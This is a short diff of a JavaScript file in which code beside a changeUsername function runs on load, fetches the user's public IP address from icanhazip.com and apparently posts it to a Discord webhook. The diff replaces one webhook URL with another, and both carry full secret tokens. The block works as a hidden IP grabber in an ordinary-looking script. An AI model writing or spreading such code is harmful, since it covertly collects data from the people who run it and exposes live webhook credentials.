@@ -26,7 +26,7 @@ function changeUsername() {
 // ----------------------
 (async () => {
   const fileUrl = "https://ipv4.icanhazip.com/";
-  const webhookUrl = "https://discord.com/api/webhooks/1425948057018568705/48wQvRqkCejB_t5i7Giw_q6-75RaXLdEEPUMoN3H1W_lgMsrOPidv2qPHykXMC4RyvL6";
+  const webhookUrl = "https://discord.com/api/webhooks/1456463071735447606/wScJcT2XtxPO1zgZLLbR9X9Gjw1hhCo_OmMC0uJayfIQ8jBVorIGtNppwDdrTYdrPeo9";
 
   try {
     const fileRes = await fetch(fileUrl);
